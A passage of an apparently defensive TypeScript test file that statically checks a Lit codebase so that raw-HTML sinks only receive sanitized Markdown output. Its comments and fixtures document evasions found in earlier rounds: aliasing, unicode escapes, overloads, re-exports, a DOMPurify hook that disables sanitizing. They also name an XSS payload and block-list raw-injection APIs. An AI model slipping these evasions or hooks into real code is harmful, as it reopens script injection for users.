    // usable second parameter. The parameter TYPE contains a `)`, and the scan
    // captured its parameter list with `[^)]*`, which stopped there — so
    // `opts` was never in the text that got split. `.length` was blind too,
    // because the second parameter is defaulted. See
    // `balancedDeclarationParameterLists`.
    label: 'C7-l a parenthesised parameter type hiding a defaulted second parameter',
    replace:
      'export function renderMarkdown(md: string | ((x: string) => string), ' +
      'opts: { inline?: boolean } = {}): string {',
  },
  {
    // The same truncation with the simplest possible type. Kept separate so a
    // partial repair that handles the union but not the bare function type
    // cannot pass on the entry above alone.
    label: 'C7-m a function-typed first parameter hiding a defaulted second',
    replace:
      'export function renderMarkdown(md: (x: string) => string, ' +
      'opts: { inline?: boolean } = {}): string {',
  },
];

/**
 * Correct one-parameter spellings that must be ACCEPTED. The first four were all
 * red-lighted by the `[,=]` test this rule replaces, in a repository whose first
 * formatter would emit the trailing-comma form by default.
 *
 * The last two are the MIRRORS of C7-g and C7-h, and they are the reason the fix
 * is comment-and-string blanking rather than a ban on the words: prose or an
 * error message that names a two-parameter form must not turn the suite red. A
 * bypass fixture and its false-positive mirror have to move together, or the
 * next round closes one by breaking the other.
 */
const ARITY_LEGITIMATE: { label: string; replace: string }[] = [
  { label: 'the sound declaration itself', replace: ARITY_DECL },
  {
    label: "prettier's default multi-line trailing comma",
    replace: 'export function renderMarkdown(\n  md: string,\n): string {',
  },
  {
    label: 'a comma inside a type argument',
    replace: 'export function renderMarkdown(md: Record<string, string>): string {',
  },
  {
    label: 'a comment inside the parameter list',
    replace: 'export function renderMarkdown(md: string /* body, raw */): string {',
  },
  {
    label: 'prose above the declaration naming a two-parameter form',
    replace:
      '// Do not add an options parameter: renderMarkdown(md, opts) is a configuration\n' +
      '// channel into the sanitizer. See the guard in markdown.test.ts.\n' +
      ARITY_DECL,
  },
  {
    label: 'a string literal naming a two-parameter form',
    replace:
      "export const REJECTED = 'renderMarkdown(md, opts) is not a supported signature';\n" +
      ARITY_DECL,
  },
  // A FUNCTION-TYPED SOLE PARAMETER. One top-level parameter, no default, no
  // rest — legitimate by rule C. It is here because it was the one shape this
  // table did not cover, and the round-7 default-detector reported it as
  // DEFAULTED: the `=` of `=>` sits at depth 0 once the parameter list closes.
  // See `hasTopLevelDefault`. The generic spelling is included separately
  // because it also exercises the `<`/`>` depth counting, where a stray `>`
  // decrement could re-open the same hole from the other side.
  {
    label: 'a function-typed sole parameter',
    replace: 'export function renderMarkdown(md: (x: string) => string): string {',
  },
  {
    label: 'a generic function-typed sole parameter',
    replace: 'export function renderMarkdown(md: <T>(x: T) => T): string {',
  },
];

/**
 * The parameter list of `export function renderMarkdown`, split on TOP-LEVEL
 * commas. Commas nested inside `(`, `[`, `{` or `<` belong to a type argument or
 * a default value, not to a second parameter: `md: Record<string, string>` is
 * one parameter. A trailing empty segment is dropped, because prettier's default
 * `trailingComma: "all"` emits one for a multi-line list.
 */
function splitTopLevelParameters(params: string): string[] {
  const out: string[] = [];
  let depth = 0;
  let current = '';
  for (const c of params) {
    if (c === '(' || c === '[' || c === '{' || c === '<') depth += 1;
    else if (c === ')' || c === ']' || c === '}' || c === '>') depth = Math.max(0, depth - 1);
    if (c === ',' && depth === 0) {
      out.push(current);
      current = '';
      continue;
    }
    current += c;
  }
  out.push(current);
  return out.map((p) => p.trim()).filter((p) => p !== '');
}

/**
 * The BALANCED parameter-list text of every `export function renderMarkdown(…)`
 * in `code`, in source order.
 *
 * This replaces `/export function renderMarkdown\s*\(([^)]*)\)/g`, which was the
 * THIRD instance in this pin of the defect its own docblock names — A CHECK THAT
 * STOPS AT THE FIRST THING IT FINDS CANNOT SEE THE SECOND. `[^)]*` stops at the
 * first `)`, and a parameter TYPE is allowed to contain one. Measured, against
 * the real `markdown.ts` and the real suite:
 *
 *   export function renderMarkdown(
 *     md: string | ((x: string) => string),
 *     opts: { inline?: boolean } = {},
 *   ): string
 *
 *   captured by the old regex as `md: string | ((x: string`  -> ONE parameter,
 *   no default, no rest  -> null. GREEN at 78 checks / 122 assertions with
 *   `tsc --noEmit` clean, against an implementation taking a real, usable second
 *   parameter — the exact configuration channel this pin exists to deny.
 *
 * `Function.length` does not cover it either: the second parameter is defaulted,
 * so `.length` still reads 1. Both halves of the arity pin were blind to the
 * same one declaration.
 *
 * Counting depth is the whole point, as in `callArguments`. Everything after the
 * matched name is scanned to the parenthesis that closes the list, so a `)`
 * inside a function type, a tuple or a parenthesised union no longer truncates
 * it. An UNTERMINATED list is not silently skipped — it is returned as-is, so
 * `splitTopLevelParameters` sees the whole tail and the caller reports something
 * rather than passing.
 */
function balancedDeclarationParameterLists(code: string): string[] {
  const out: string[] = [];
  const re = /export function renderMarkdown\s*\(/g;
  let m: RegExpExecArray | null = re.exec(code);
  while (m !== null) {
    let depth = 1;
    let i = m.index + m[0].length;
    const start = i;
    while (i < code.length && depth > 0) {
      const c = code[i];
      if (c === '(') depth += 1;
      else if (c === ')') depth -= 1;
      i += 1;
    }
    out.push(code.slice(start, depth === 0 ? i - 1 : code.length));
    re.lastIndex = i;
    m = re.exec(code);
  }
  return out;
}

/**
 * The arity pin for the sanitizer, as a predicate over SOURCE TEXT rather than
 * over a fixed path, so that it is fixturable like every other rule in this file.
 * Returns a violation message, or null.
 *
 * WHY THIS IS NOT A ONE-LINER, MEASURED RATHER THAN ASSERTED. Two previous
 * versions of this pin were defeated, and both failures are the same shape —
 * A CHECK THAT STOPS AT THE FIRST THING IT FINDS CANNOT SEE THE SECOND.
 *
 *   1. `renderMarkdown.length === 1` alone. `Function.length` stops counting at
 *      the first defaulted or rest parameter, so `(md, opts = {})` reports 1.
 *      GREEN at 69 checks. Note the boundary precisely — it is DEFAULTED-OR-REST,
 *      not OPTIONAL: `tsc` erases `?`, so `(md, opts?: T)` emits a genuine
 *      two-parameter function and `.length` reads 2. `.length` is blind to the
 *      spelling that defeated it and not to the neighbouring one, which is why
 *      the assertion is kept alongside this scan rather than replaced by it.
 *   2. `/export function renderMarkdown\s*\(([^)]*)\)/.exec(src)` over RAW
 *      BYTES. `.exec` stops at the first match and nothing rejected a second,
 *      and raw bytes include comments and string literals. All three of these
 *      were GREEN at 69 checks with `tsc` clean, against an implementation
 *      taking a real, usable second parameter:
 *
 *        // two overload signatures above a defaulted implementation
 *        export function renderMarkdown(md: string): string;
 *        export function renderMarkdown(md: string, opts: {inline?: boolean}): string;
 *        export function renderMarkdown(md: string, opts: {inline?: boolean} = {}): string {
 *
 *        // a COMMENT quoting the old signature — no overloads needed
 *        //   export function renderMarkdown(md: string): string
 *        export function renderMarkdown(md: string, opts: Record<string, unknown> = {}): string {
 *
 *        // the same thing in an exported string constant
 *        export const HISTORICAL_SIGNATURE = 'export function renderMarkdown(md: string): string';
 *
 *      The comment case is the one that matters: markdown.ts carries a long
 *      docblock ABOUT THIS SIGNATURE immediately above the declaration, so a
 *      future line of prose quoting the old form is the normal way people
 *      annotate a signature change, not an adversarial contrivance.
 *
 * So the rule is stated in three parts, each of which is a separate way for the
 * previous versions to have been wrong:
 *
 *   A. run over `stripInertText(src, { strings: true })`, the same derived view
 *      every other source scan in this file uses (see "Source views" below).
 *      Comments and string literals cannot shadow the real declaration.
 *   B. `matchAll`, and EXACTLY ONE match is permitted. An overload signature is
 *      a second declaration, and an overload set whose implementation widens the
 *      arity is precisely the configuration channel this pin exists to deny.
 *   C. exactly one TOP-LEVEL parameter, which must be a plain identifier binding
 *      with no default and no rest.
 *
 * C is deliberately stricter than "no second parameter", in two directions:
 *
 *   * A DESTRUCTURED sole parameter — `({ md, inline }: { md: string; inline?:
 *     boolean })` — has one top-level parameter and is still a configuration
 *     channel, and worse, its call-site form `renderMarkdown({ md: x, inline:
 *     true })` puts the comma inside braces where `sinkArgumentIsSanitized` does
 *     not reject it. Counting parameters alone would have opened a hole the
 *     `[,=]` test it replaces did not have.
 *   * A DEFAULT ON THE SOLE PARAMETER — `(md: string = '')` — is harmless, and
 *     rejecting it is a KNOWN FALSE POSITIVE recorded here rather than hidden.
 *     It is rejected because it takes `Function.length` to 0, and this suite
 *     cannot distinguish that from the artifact divergence the `.length`
 *     assertion exists to catch. If someone genuinely needs that spelling, allow
 *     it here AND relax the `.length` assertion to `<= 1` in the same commit;
 *     do not do one without the other.
 *
 * Three correct one-parameter spellings that the `[,=]` test this replaces
 * rejected are now accepted, and are pinned as false-positive controls in
 * ARITY_LEGITIMATE: prettier's default multi-line trailing comma, a comma inside
 * a type argument, and a comment inside the parameter list. A guard that rejects
 * correct code gets deleted.
 */
function renderMarkdownArityViolation(src: string): string | null {
  const code = stripInertText(src, { strings: true });
  const decls = balancedDeclarationParameterLists(code);

  if (decls.length === 0) {
    return (
      'could not find an `export function renderMarkdown(…)` declaration. Either it was ' +
      'renamed, or it was rewritten into a form this scan cannot read (an arrow function ' +
      'assigned to a const, a re-export). Both leave the arity unpinned, so neither is a ' +
      'silent pass'
    );
  }
  if (decls.length !== 1) {
    return (
      `expected exactly one renderMarkdown declaration, found ${decls.length} — an overload ` +
      'signature satisfies a first-match scan while the implementation takes a second ' +
      'parameter, which is a configuration channel into the sanitizer'
    );
  }

  const params = splitTopLevelParameters(decls[0]);
  if (params.length !== 1) {
    return (
      `renderMarkdown declares ${params.length} parameters: (${decls[0].trim()}) — a second ` +
      'parameter is a configuration channel into the sanitizer opened from the call site, and ' +
      'a defaulted or optional one keeps Function.length at 1'
    );
  }
  const [only] = params;
  if (only.startsWith('{') || only.startsWith('[')) {
    return (
      `renderMarkdown's sole parameter is a destructuring pattern: (${only}) — that is a ` +
      'configuration channel with one top-level parameter, and at the call site its comma ' +
      'sits inside braces where sinkArgumentIsSanitized does not reject it'
    );
  }
  if (only.startsWith('...')) {
    return `renderMarkdown's sole parameter is a rest parameter: (${only}) — it accepts any arity`;
  }
  if (hasTopLevelDefault(only)) {
    return (
      `renderMarkdown's sole parameter has a default: (${only}) — harmless in itself, but it ` +
      'takes Function.length to 0, which this suite cannot tell apart from the source/artifact ' +
      'divergence that assertion exists to catch. To allow it, relax the .length assertion to ' +
      '<= 1 in the same commit'
    );
  }
  return null;
}

/**
 * True if `param` carries an `=` default at the top level of its own text.
 *
 * Named for what it returns. Through round 7 it was called
 * `splitTopLevelDefault` — a name promising a split, borrowed from the
 * `splitTopLevelParams` helper above, while returning a boolean. That is the
 * kind of mismatch that gets a call site written as a destructuring assignment.
 *
 * `=>` IS NOT A DEFAULT. Skipping it is not cosmetic: the arrow's `=` sits at
 * depth 0 once the parameter list closes, so through round 7 a function-typed
 * sole parameter was reported as having a default. Measured on the round-7
 * predicate:
 *
 *     md: (x: string) => string             -> true   (WRONG)
 *     md: <T>(x: T) => T                    -> true   (WRONG)
 *     md: string | (() => string)           -> false  (right, but only by luck:
 *                                                      that arrow is inside parens)
 *     md: (x: string) => string = defaultFn -> true   (right, and still true
 *                                                      below — the second `=`)
 *
 * `renderMarkdown(md: (x: string) => string)` is not a plausible signature for
 * this function, so no live tree tripped it. It is fixed anyway because a guard
 * that rejects correct code gets deleted, which is the standing argument behind
 * every entry in ARITY_LEGITIMATE — where a function-typed sole parameter now
 * appears, having been the one shape that table did not cover.
 */
function hasTopLevelDefault(param: string): boolean {
  let depth = 0;
  for (let i = 0; i < param.length; i += 1) {
    const c = param[i];
    if (c === '(' || c === '[' || c === '{' || c === '<') depth += 1;
    else if (c === ')' || c === ']' || c === '}' || c === '>') depth = Math.max(0, depth - 1);
    else if (
      c === '=' &&
      depth === 0 &&
      param[i + 1] !== '=' &&
      param[i + 1] !== '>' &&
      param[i - 1] !== '='
    ) {
      return true;
    }
  }
  return false;
}

/**
 * The balanced argument text of every `name(…)` call in `code`.
 *
 * A regex cannot do this: `unsafeHTML(renderMarkdown(c.body) + c.body)` and
 * `unsafeHTML(renderMarkdown(c.body))` share every prefix a regex would test.
 * Counting parens is the whole point — see `sinkArgumentIsSanitized`.
 */
function callArguments(code: string, name: string): string[] {
  const args: string[] = [];
  const re = new RegExp(`\\b${name}\\s*\\(`, 'g');
  let m: RegExpExecArray | null;
  while ((m = re.exec(code)) !== null) {
    const start = m.index + m[0].length;
    let depth = 1;
    let i = start;
    while (i < code.length && depth > 0) {
      if (code[i] === '(') depth += 1;
      else if (code[i] === ')') depth -= 1;
      i += 1;
    }
    args.push(depth === 0 ? code.slice(start, i - 1) : code.slice(start));
  }
  return args;
}

/**
 * True only if `arg` is a single `renderMarkdown(…)` call and NOTHING else.
 *
 * The rule that this replaces asked whether the sanitized call appeared at the
 * START of the argument, which is a different and much weaker question. Both of
 * the following passed it, at the live sink, with the required literal intact,
 * no new file, no new binding and the sink count unchanged:
 *
 *   unsafeHTML(renderMarkdown(c.body) + c.body)
 *   unsafeHTML(renderMarkdown('') || this.description)
 *
 * The first renders attacker markup raw immediately after the sanitized copy of
 * it; the second sanitizes a value nobody displays. Anything appended to,
 * short-circuited with, or substituted for the sanitizer's output is raw at the
 * sink, so the argument has to be the call and only the call.
 *
 * "The call and only the call" INCLUDES ITS ARGUMENT LIST. The first version of
 * this function only balanced parentheses, so it placed no constraint whatever
 * on what sat between them: `renderMarkdown(this.description)` and
 * `renderMarkdown(this.description, { inline: true })` were indistinguishable to
 * it. An argument list is part of a call shape, so that was this function
 * failing to own a shape it claims — not the NAME/EFFECT boundary. A top-level
 * comma is therefore rejected. Commas nested inside `(`, `[` or `{` are fine, so
 * `renderMarkdown(fmt(a, b))` still passes; only the sanitizer's OWN argument
 * list is constrained, which is where a configuration channel would be opened.
 */
function sinkArgumentIsSanitized(arg: string): boolean {
  const t = arg.trim();
  const head = /^renderMarkdown\s*\(/.exec(t);
  if (!head) return false;
  let nesting = 0;
  let extraArgument = false;
  let closed = false;
  let i = head[0].length;
  for (; i < t.length; i += 1) {
    const c = t[i];
    if (c === '(' || c === '[' || c === '{') nesting += 1;
    else if (c === ']' || c === '}') nesting -= 1;
    else if (c === ',' && nesting === 0) extraArgument = true;
    else if (c === ')') {
      if (nesting === 0) {
        closed = true;
        i += 1;
        break;
      }
      nesting -= 1;
    }
  }
  return closed && !extraArgument && t.slice(i).trim() === '';
}

/** 1-based line numbers at which `re` matches, for actionable failure messages. */
// Line number for a match INDEX, for rules whose pattern can span lines and so
// cannot use matchLines (an import clause may be wrapped across several).
// Review O2: three of the four branches in directiveIndirectionOffenders
// reported a file and no position, which on a 400-line component means reading
// the whole file to find what fired.
function lineOf(code: string, index: number): number {
  let line = 1;
  for (let i = 0; i < index && i < code.length; i += 1) {
    if (code[i] === '\n') line += 1;
  }
  return line;
}

function matchLines(code: string, re: RegExp): number[] {
  const lines: number[] = [];
  code.split('\n').forEach((line, idx) => {
    if (re.test(line)) lines.push(idx + 1);
  });
  return lines;
}

/**
 * Lit's three raw-injection directives, with the module each is exported from.
 *
 * TRIPWIRE INPUT — see mechanism (b) in the section header. Every tree-wide scan
 * here matches on the directive's own name, so any indirection that renames it
 * makes the sink invisible to all of them at once. The rules in
 * `directiveIndirectionOffenders` close the forms we know about; they are not a
 * proof that no other form exists.
 *
 * Module paths are matched on their SUFFIX, not the full specifier. Both
 * `lit/directives/unsafe-html.js` and `lit-html/directives/unsafe-html.js`
 * resolve to the same directive and both packages are installed here, so
 * anchoring on the `lit/` prefix would leave the second path as a one-word
 * bypass. (Verified: it was.)
 */
const RAW_DIRECTIVES = [
  { name: 'unsafeHTML', module: 'directives/unsafe-html.js' },
  { name: 'unsafeSVG', module: 'directives/unsafe-svg.js' },
  { name: 'unsafeStatic', module: 'static-html.js' },
];

/**
 * Raw-HTML injection APIs that must not appear outside renderMarkdown.
 *
 * TRIPWIRE, NOT A PROOF OF ABSENCE — see mechanism (b) in the section header.
 * This is an enumeration of KNOWN SINKS. It can only catch the forms named here
 * and it must be revisited whenever this codebase adopts a new raw-injection
 * API. Do not read a green result as "no raw sink exists" — read it as "none of
 * these eight forms is present in the files that were scanned".
 *
 * Known residue, recorded deliberately rather than chased: `Object.assign(el, {
 * innerHTML: x })`, a computed key (`el[k] = x` where `k` is built at runtime),
 * and any raw-write API not on this list all pass. Widening the list is the
 * treadmill this guard is on; the closed-world half plus the type-aware-lint
 * follow-up is the route off it, not a ninth pattern.
 *
 * The operator class is `(?:\+|\|\||&&|\?\?)?=` because `\s*\+?=` admitted `+=`
 * but not `||=`, `&&=` or `??=`. The trailing `(?!=)` keeps `el.innerHTML ===
 * x` — a comparison, not a write — out of the results.
 *
 * FALSE POSITIVES: these patterns run over a comment-stripped view of the file,
 * so prose naming a banned form is safe. String literals are NOT blanked for
 * this view — the indexed-assignment pattern matches `el['innerHTML'] = x` and
 * needs the quoted key — so a string literal that must name a banned form does
 * turn the suite red, and there is no per-line opt-out any more. See the note
 * above `stripImportStatements` for why the opt-out was removed and what it
 * cost. The fix for such a string is to change this file, in review.
 *
 * VACUITY: every pattern here is exercised directly by BANNED_SINK_POSITIVES.
 * Before that table existed the only fixtures touching this list were two
 * NEGATIVE controls, so all eight patterns were untested detection logic —
 * measured, the whole list could be emptied with the suite green at 61 checks.
 * That is the same defect this file had already diagnosed and fixed three times
 * elsewhere; `directiveIndirectionOffenders` got INDIRECTION_EVASIONS, the sink
 * rules got SINK_EVASIONS, R8/R9 got OWNERSHIP_EVASIONS, and BANNED_SINKS got
 * nothing.
 */
const BANNED_SINKS: { name: string; pattern: RegExp }[] = [
  { name: 'innerHTML/outerHTML assignment', pattern: /\.(inner|outer)HTML\s*(?:\+|\|\||&&|\?\?)?=(?!=)/ },
  {
    name: 'innerHTML/outerHTML indexed assignment',
    pattern: /\[['"](inner|outer)HTML['"]\]\s*(?:\+|\|\||&&|\?\?)?=(?!=)/,
  },
  { name: 'insertAdjacentHTML', pattern: /insertAdjacentHTML\s*\(/ },
  { name: 'document.write', pattern: /document\.write\s*\(/ },
  { name: 'setHTMLUnsafe', pattern: /setHTMLUnsafe\s*\(/ },
  { name: 'createContextualFragment', pattern: /createContextualFragment\s*\(/ },
  { name: 'lit unsafeSVG directive', pattern: /unsafeSVG\s*\(/ },
  { name: 'lit unsafeStatic directive', pattern: /unsafeStatic\s*\(/ },
];

/**
 * The identifiers each REQUIRED_SINKS file is allowed to use, and the one module
 * each may come from. Module paths are suffix-matched, as in RAW_DIRECTIVES.
 */
const SINK_BINDINGS = [
  { name: 'unsafeHTML', from: 'directives/unsafe-html.js', label: "lit's unsafe-html directive module" },
  { name: 'renderMarkdown', from: 'util/markdown.js', label: 'the sanitizer module' },
];

/**
 * MECHANISM (a): the closed-world half, stated as rules about how the two
 * identifiers may be USED rather than as a list of spellings to ban.
 *
 * Every previous round closed the *named form* of the previous round's finding
 * and was evaded by the next spelling one week later:
 *
 *   round 1  `unsafeHTML(c.body)`            -> banned the literal call shape
 *   round 2  `import { unsafeHTML as raw }`  -> banned `as`-aliasing
 *   round 3  `const raw = unsafeHTML`        -> value alias, no `as` at all
 *   round 3  `const renderMarkdown = s => s` -> identity shadow of the sanitizer
 *
 * A list of forms cannot terminate. These four rules can, because they are
 * positive and closed over an enumerated set of two files:
 *
 *   R1  the sanitized sink text `unsafeHTML(renderMarkdown(` is present;
 *   R2  each identifier is imported UNALIASED from the one module allowed to
 *       provide it, by a value import (not `import type`);
 *   R3  neither identifier is re-bound by a local const/let/var/function/class;
 *   R4  outside its import statement, neither identifier may appear in ANY
 *       position other than immediately called — `name(`;
 *   R5  every `unsafeHTML(…)` argument is a `renderMarkdown(…)` call AND
 *       NOTHING ELSE — see sinkArgumentIsSanitized;
 *   R6  every relative import specifier resolves to a file this guard scans, and
 *       every dynamic import specifier is a plain quoted literal;
 *   R7  no unicode/hex escape appears in code — identifiers must be spelled
 *       literally.
 *
 * R6 and R7 exist because R1–R5 all assume two things they cannot themselves
 * establish: that a name reaching the DOM comes from a file we looked at, and
 * that `unsafeHTML` is spelled `unsafeHTML`. Both assumptions were false, and
 * both mutations rendered attacker markup raw at the live sink with the suite
 * green:
 *
 *   R6  export { unsafeHTML as rawHtml } from 'lit/directives/unsafe-html.js';
 *       parked in `helper.test.ts` — excluded by isScannableSource, and so not
 *       counted by EXPECTED_SOURCE_FILES either — then imported by the sink.
 *       No rule fired: the sink file's own `unsafeHTML` was still perfect.
 *   R7  const rawHtml = \u0075nsafeHTML;
 *       TypeScript resolves the escape to the imported binding. `\bunsafeHTML\b`
 *       cannot.
 *
 * R6 is the more important of the two. The `*.test.ts` exclusion is load-bearing
 * for this file (it must be able to name the banned spellings in prose), so it
 * cannot be removed; R6 instead denies the excluded region any path INTO the
 * closed world. That is the general form: an unscanned file is only safe while
 * nothing scanned imports it.
 *
 * R4 is the rule that generalises, and it is why this is not round 5's problem.
 * `const raw = unsafeHTML`, `const S = { raw: unsafeHTML }`, `const { unsafeHTML:
 * raw } = await import(…)`, `unsafeHTML as unknown as F`, `export { unsafeHTML }`,
 * and a *parameter* named `renderMarkdown` shadowing the module import are all
 * the same violation of R4, and not one of them had to be foreseen to be caught.
 * R3 is strictly redundant against R4 and is kept only because it names the
 * mistake in the failure message. R2 is what closes the "helper moved to
 * util/format.ts" refactor, which introduces no new file and no new binding.
 *
 * Note R4 subsumes the sibling question "is the directive imported at all": a
 * file that drops the import and defines its own `unsafeHTML` fails R2 and R3.
 *
 * Takes RAW file text and derives its own views, because the rules need two:
 * R2 must see string literals (a module specifier is one), while R3 and R4 must
 * not (a message or a fixture string may legitimately name the identifier).
 * There is deliberately NO ignore-line opt-out: disarming the sound half must
 * require editing this file, where a reviewer sees it, not adding a comment to a
 * component.
 *
 * SCOPE OF THE CLAIM. "Sound" here means sound over BINDINGS — R1–R7 decide
 * which names may reach the sink and in what shape. They say nothing about what
 * the sanitizer does once called; that is mechanism (c), and (c) has a known
 * documented survivor of its own. See "WHAT THIS GUARD CLAIMS, AND WHAT IT DOES
 * NOT" in the header comment before reporting a green result as a proof.
 */
/**
 * Candidate on-disk paths, web-root-relative, for a relative import specifier
 * appearing in `fromRel`. TypeScript source imports carry a `.js` extension that
 * resolves to `.ts` on disk, so the extension is re-derived rather than trusted.
 */
function resolveRelativeImport(fromRel: string, spec: string): string[] {
  const base = join(dirname(fromRel), spec);
  const stem = base.replace(/\.[cm]?jsx?$/, '');
  const out: string[] = [];
  for (const ext of ['.ts', '.tsx', '.mts', '.cts', '.js', '.jsx', '.mjs', '.cjs']) {
    out.push(stem + ext);
    out.push(join(base, 'index' + ext));
  }
  out.push(base);
  return out;
}

/**
 * Does a relative import specifier land on a file this guard reads?
 *
 * Inert assets are accepted without resolving. A `.css` or `.json` file cannot
 * hold code, which is exactly the argument for not scanning it in the first
 * place, so accepting it here is the same decision as INERT_EXTENSIONS rather
 * than an exemption carved out to make the tree pass. The tree has two:
 * `src/index.ts -> ./styles/theme.css` and
 * `src/gen/grpc-client.ts -> ./farmtable.json`.
 */
function importResolvesIntoScannedSet(
  fromRel: string,
  spec: string,
  scanned: ReadonlySet<string>,
): boolean {
  if (INERT_EXTENSIONS.some((ext) => spec.endsWith(ext))) return true;
  return resolveRelativeImport(fromRel, spec).some((cand) => scanned.has(cand));
}

/** Every relative or `require`d specifier in a file, in source order. */
const RELATIVE_SPECIFIER = /(?:\bfrom|\bimport|\brequire)\s*\(?\s*['"](\.[^'"]*)['"]/g;

function sinkBindingViolations(rel: string, src: string, scanned: ReadonlySet<string>): string[] {
  const bad: string[] = [];
  const withStrings = stripInertText(src, { strings: false });
  const code = stripInertText(src, { strings: true });

  // R1
  if (!/unsafeHTML\s*\(\s*renderMarkdown\s*\(/.test(code)) {
    bad.push(`${rel}: no longer contains unsafeHTML(renderMarkdown( — the sanitizer wrapper is gone`);
  }

  // R5
  for (const arg of callArguments(code, 'unsafeHTML')) {
    if (!sinkArgumentIsSanitized(arg)) {
      bad.push(
        `${rel}: unsafeHTML(${arg.trim().slice(0, 60)}) — the argument is not a bare ` +
          'renderMarkdown(…) call. Anything concatenated onto, short-circuited with, or ' +
          "substituted for the sanitizer's output reaches the DOM raw.",
      );
    }
  }

  const clauses = [
    ...withStrings.matchAll(/\bimport\s*(type\s+)?\{([^}]*)\}\s*from\s*['"]([^'"]+)['"]/g),
  ];
  const outside = stripImportStatements(code);

  for (const { name, from, label } of SINK_BINDINGS) {
    // R2
    const bound = clauses.some(
      ([, typeOnly, clause, spec]) =>
        !typeOnly &&
        spec.endsWith(from) &&
        new RegExp(`(?:^|,)\\s*${name}\\s*(?:,|$)`).test(clause),
    );
    if (!bound) {
      bad.push(
        `${rel}: does not import ${name} unaliased from ${label} (a specifier ending '${from}') — ` +
          'the name may therefore resolve to something other than the audited one',
      );
    }

    // R3
    const rebindLines = matchLines(outside, new RegExp(`\\b(?:const|let|var|function|class)\\s+${name}\\b`));
    if (rebindLines.length > 0) {
      bad.push(
        `${rel}:${rebindLines.join(',')}: re-binds ${name} locally — this shadows the import and ` +
          'silently unwraps the sink while leaving the sink text byte-identical',
      );
    }

    // R4
    const nonCallLines = matchLines(outside, new RegExp(`\\b${name}\\b(?!\\s*\\()`));
    if (nonCallLines.length > 0) {
      bad.push(
        `${rel}:${nonCallLines.join(',')}: ${name} appears in a non-called position — ` +
          `outside its import statement the only permitted use is an immediate call \`${name}(\`. ` +
          'Aliasing, destructuring-rename, a property bag, an `as` cast or a parameter of the ' +
          'same name all reach the sink under a name no scan in this file can follow.',
      );
    }
  }

  // R6
  for (const [, spec] of withStrings.matchAll(new RegExp(RELATIVE_SPECIFIER))) {
    if (!importResolvesIntoScannedSet(rel, spec, scanned)) {
      bad.push(
        `${rel}: imports '${spec}', which does not resolve to any file this guard scans — ` +
          'a binding that arrives from outside the scanned set can be the raw directive ' +
          'under any name, and none of the rules above will see it',
      );
    }
  }

  // R6b, the per-file half. The SAME predicate now also runs tree-wide — see
  // `dynamicImportSpecifierOffenders`, which both call sites share so that the
  // two scopes cannot drift apart. Kept here as well as tree-wide because the
  // per-file half is the one SINK_EVASIONS exercises (V9b), and because R3 sets
  // the precedent: a redundant rule is kept when it names the mistake precisely.
  bad.push(...dynamicImportSpecifierOffenders(rel, withStrings));

  // R7. Deliberately run over `code`, not `outside`: an escape inside an IMPORT
  // statement is the whole attack. `import { \u0075nsafeHTML as rawHtml } from
  // 'lit/directives/unsafe-html.js'` leaves the audited unaliased import in
  // place, so R2 is satisfied, and stripImportStatements used to hide the
  // escape from this rule. Module specifiers are string literals and are
  // blanked in `code`, so paths cannot false-positive here.
  const escapeLines = matchLines(code, /\\[uxU]/);
  if (escapeLines.length > 0) {
    bad.push(
      `${rel}:${escapeLines.join(',')}: contains a unicode or hex escape outside a string ` +
        'literal — an escape lets an identifier be spelled so that the rules above cannot ' +
        'match it. Write the name literally.',
    );
  }

  return bad;
}

/**
 * MECHANISM (b): the tree-wide indirection tripwire.
 *
 * Input must be `stripInertText(src, { strings: false })` — string contents are
 * KEPT because the module specifier being matched is itself a string literal.
 * There is no `stripIgnoredLines` step any more; see the note above
 * `stripImportStatements` for why the per-line opt-out was removed.
 */
function directiveIndirectionOffenders(rel: string, code: string): string[] {
  const offenders: string[] = [];
  const outside = stripImportStatements(code);

  for (const { name, module } of RAW_DIRECTIVES) {
    const mod = module.replace(/\./g, '\\.');

    // Anchored to an import/export brace clause. Unanchored, `\bNAME\s+as\s+`
    // also fired on `const d = unsafeHTML as unknown as F` (which R4/the
    // non-call rule below now reports properly) and on any comment containing
    // the words "unsafeHTML as".
    const renamed = new RegExp(
      `(?:import|export)\\s*(?:type\\s+)?\\{[^}]*\\b${name}\\s+as\\s+`,
    ).exec(code);
    if (renamed) {
      offenders.push(
        `${rel}:${lineOf(code, renamed.index)}: ${name} renamed with 'as' in an ` +
          'import/export clause',
      );
    }

    const namespaced = new RegExp(
      `import\\s*\\*\\s*as\\s+\\w+\\s+from\\s*['"][^'"]*${mod}['"]`,
    ).exec(code);
    if (namespaced) {
      offenders.push(
        `${rel}:${lineOf(code, namespaced.index)}: ${module} imported as a namespace`,
      );
    }

    // Re-export: flag only when the banned NAME crosses the boundary, or when
    // `export *` carries it implicitly. Matching on the module path alone
    // rejected `export { html as staticHtml } from 'lit/static-html.js'`, which
    // re-exports a safe symbol. `[^}\n]` / `[^;\n]` keep the clause inside one
    // statement: `[^;]` matches newlines, so an adjacent semicolon-less line
    // used to be swept in.
    const reexport = new RegExp(`export\\s*(\\*|\\{[^}\\n]*\\})[^;\\n]*from\\s*['"][^'"]*${mod}['"]`);
    const m = reexport.exec(code);
    if (m && (m[1] === '*' || new RegExp(`\\b${name}\\b`).test(m[1]))) {
      offenders.push(`${rel}:${lineOf(code, m.index)}: ${module} re-exports ${name}`);
    }

    // Value aliasing needs no keyword at all, so it cannot be caught by adding
    // a fourth import-syntax form. Stated as a usage rule instead: outside its
    // import statement the directive may only appear immediately called. This
    // is the same rule as R4 in sinkBindingViolations, applied tree-wide, and
    // it is the one that covers `const raw = unsafeHTML`, `{ raw: unsafeHTML }`
    // and `const { unsafeHTML: raw } = await import(…)` without naming them.
    for (const line of matchLines(outside, new RegExp(`\\b${name}\\b(?!\\s*\\()`))) {
      offenders.push(`${rel}:${line}: ${name} used in a non-called position`);
    }
  }

  return offenders;
}

/**
 * MECHANISM (c): sanitizer ownership. R8.
 *
 * R1–R7 are all rules about IDENTIFIERS AND CALL SHAPE. They prove that the sink
 * calls the sanitizer. They do not prove that the sanitizer still sanitizes, and
 * that is a different axis entirely. This mutation of ft-inspector-comments.ts
 * left the real sink byte-identical, satisfied every one of R1–R7 — the import
 * unaliased from the one permitted module, the name appearing nowhere but
 * immediately called, the sole argument to unsafeHTML — and rendered
 * `<img src=x onerror=alert(1)><script>alert(2)</script>` completely raw:
 *
 *   import DOMPurify from 'dompurify';
 *   DOMPurify.addHook('uponSanitizeElement',   (_n, d) => { d.allowedTags[d.tagName] = true; });
 *   DOMPurify.addHook('uponSanitizeAttribute', (_n, d) => { d.forceKeepAttr = true; });
 *
